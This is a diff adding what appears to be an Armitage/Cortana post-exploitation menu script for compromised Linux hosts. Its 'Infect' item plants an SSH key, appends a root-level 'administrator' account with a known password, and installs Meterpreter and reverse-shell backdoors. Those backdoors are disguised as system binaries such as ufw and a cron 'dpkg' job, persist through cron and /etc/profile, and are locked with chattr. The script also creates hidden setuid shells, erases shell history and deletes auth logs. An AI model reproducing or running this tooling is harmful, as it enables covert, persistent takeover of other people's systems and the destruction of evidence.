@@ -1,0 +1,93 @@
+popup shell {
+	item "Upload table killer" {
+		println("Test3");
+		println("Test2");
+		s_cmd($1, "chattr -i /usr/bin/seapplet");
+		shell_upload($1, "/root/scripts/seapplet", "/usr/sbin/seapplet");
+		s_cmd($1, "chmod 755 /usr/sbin/seapplet");
+		s_cmd($1, "chattr +i /usr/bin/seapllet");
+		s_cmd($1, "/usr/sbin/seapplet &");
+		shell_upload($1, "/root/scripts/my.sh", "/etc/cron.5min/my.sh");
+		s_cmd($1, "chmod 755 /etc/cron.5min/my.sh");
+		s_cmd($1, "echo '*/5 * * * * /etc/cron.5min/my.sh' >> /var/spool/cron/crontabs/root");
+	
+	}
+	item "Infect" {
+		say("Infecting " . session_host($1));
+			s_cmd($1, "mkdir /root/.ssh");
+			# on load prompt for keys or generate?
+			$handle = openf("/root/id_rsa.pub");
+			$pub_key = readln($handle);
+			s_cmd($1, "echo $pub_key >> /root/.ssh/authorized_keys");
+			closef($handle);
+
+			shell_upload($1, "/root/users.sh", "/root/letsgo");
+			s_cmd($1, "chmod +777 /root/letsgo");
+			s_cmd($1, "/root/letsgo");
+			s_cmd($1, "rm -f /root/letsgo");
+			
+			s_cmd($1, "echo 'administrator:\$6\$W6D9sKYe\$tPihBsmoYXNNBfDhmkT30tYqMdCtMN.zn9HpczbzVd0YMw9P5dAQnjQ4KqUN/4IG5xs4t1SUZP5k82vi5UWGc0:15578:0:99999:7:::' >> /etc/shadow"); # pass = abc123
+			s_cmd($1, "echo 'administrator:x:0:0:nobody,,,,:/:/bin/bash' >>/etc/passwd");
+			$ssh = "creds --add " . session_host($1) . " -p 22 -u administrator -P abc123";
+			cmd_async($ssh);
+        	
+			# Generate Payload
+			$r_lport = random_port();
+			$backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf");
+			$handle2 = openf(">/tmp/linux_backdoor");
+			writeb($handle2, $backdoor);
+			closef($handle2);	
+	
+			# set cron job
+			s_cmd($1, "mkdir /etc/cron.5min");
+			s_cmd($1, "echo '*/5 * * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.5min )' >> /etc/crontab");
+			s_cmd($1, "echo '*/5 * * * * /etc/cron.5min/dpkg' >> /var/spool/cron/crontabs/root");
+			s_cmd($1, "chmod 0600 /etc/crontab /etc/cron.5min /var/spool/cron/crontabs/root");
+			shell_upload($1, "/tmp/linux_backdoor", "/etc/cron.5min/dpkg");
+			s_cmd($1, "chmod 755 /etc/cron.5min/dpkg")
+			s_cmd($1, "chattr +i /etc/cron.5min/dpkg");
+	
+			# set profile 
+			shell_upload($1, "/tmp/linux_backdoor", "/usr/bin/ufw");
+			s_cmd($1, "chmod 775 /usr/bin/ufw");
+			s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/profile");
+			s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/skel/.profile");
+			s_cmd($1, "chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile");	
+	
+			# Create Backup Shell
+			s_cmd($1, "cp /bin/zsh /.kernel; chmod +sss /.kernel; touch -d '4 May 2004' /.kernel; chattr +i /.kernel");
+               		s_cmd($1, "cp /bin/tcsh /tmp/X11.auth; chmod +sss /tmp/X11.auth; touch -d '4 May 2004' /tmp/X11.auth");
+
+			s_cmd($1, "echo '' > .bash_history");
+			s_cmd($1, "chattr +i .bash_history");
+			s_cmd($1, "rm -f /var/log/secure");
+
+			handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST => lhost()));
+			lock();
+	}
+	item "backupshelltcsh" {
+		s_cmd($1, "chattr -i /.kernel; rm -f /.kernel; cp /bin/tcsh /.kernel; chmod +sss /.kernel; touch -d '4 May 2004' /.kernel; chattr +i /.kernel");
+	}
+	item "payloadx64" {
+		# Generate Payload
+                $r_lport = random_port();
+                $backdoor = generate("linux/x64/shell/reverse_tcp", lhost(), $r_lport, %(), "elf");
+                $handle2 = openf(">/tmp/linux_backdoor");
+                writeb($handle2, $backdoor);
+                closef($handle2);
+
+                # set cron job
+                s_cmd($1, "chattr -i /etc/cron.5min/dpkg");
+		s_cmd($1, "rm -f /etc/cron.5min/dpkg");
+		shell_upload($1, "/tmp/linux_backdoor", "/etc/cron.5min/dpkg");
+                s_cmd($1, "chmod 755 /etc/cron.5min/dpkg")
+                s_cmd($1, "chattr +i /etc/cron.5min/dpkg");
+
+		# set profile 
+		s_cmd($1, "chattr -i /usr/bin/ufw; rm -f /usr/bin/ufw");
+                shell_upload($1, "/tmp/linux_backdoor", "/usr/bin/ufw");
+                s_cmd($1, "chmod 775 /usr/bin/ufw");
+                s_cmd($1, "chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile");
+		handler("linux/x64/shell/reverse_tcp", $r_lport, %(LHOST => lhost()));
+	}		
+}
